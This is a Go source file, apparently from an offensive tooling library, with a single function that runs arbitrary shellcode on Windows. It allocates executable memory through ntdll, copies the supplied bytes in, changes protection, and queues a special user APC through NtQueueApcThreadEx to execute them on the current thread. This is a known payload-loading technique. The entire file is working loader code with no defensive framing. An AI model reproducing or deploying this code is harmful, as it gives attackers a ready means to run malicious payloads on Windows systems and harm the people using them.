package shellcode

import (
  "unsafe"
  "golang.org/x/sys/windows"
)

func NtQueueApcThreadEx(shellcode []byte) error {
  const (
    QUEUE_USER_APC_FLAGS_NONE = iota
    QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
    QUEUE_USER_APC_FLGAS_MAX_VALUE
  )

  kernel32 := windows.NewLazyDLL("kernel32.dll")
  ntdll := windows.NewLazyDLL("ntdll.dll")

  GetCurrentThread := kernel32.NewProc("GetCurrentThread")
  NtAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
  NtProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
  RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
  NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")

  var addr uintptr
  regionsize := uintptr(len(shellcode))

  r1, _, err := NtAllocateVirtualMemory.Call(^uintptr(0), uintptr(unsafe.Pointer(&addr)), 0, uintptr(unsafe.Pointer(&regionsize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
  if r1 != 0 {
    return err
  }

  RtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), regionsize)

	oldProtect := windows.PAGE_READWRITE
  r2, _, err := NtProtectVirtualMemory.Call(^uintptr(0), uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&regionsize)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
  if r2 != 0 {
    return err
  }

  thread, _, _ := GetCurrentThread.Call()

  NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)

  return nil
}
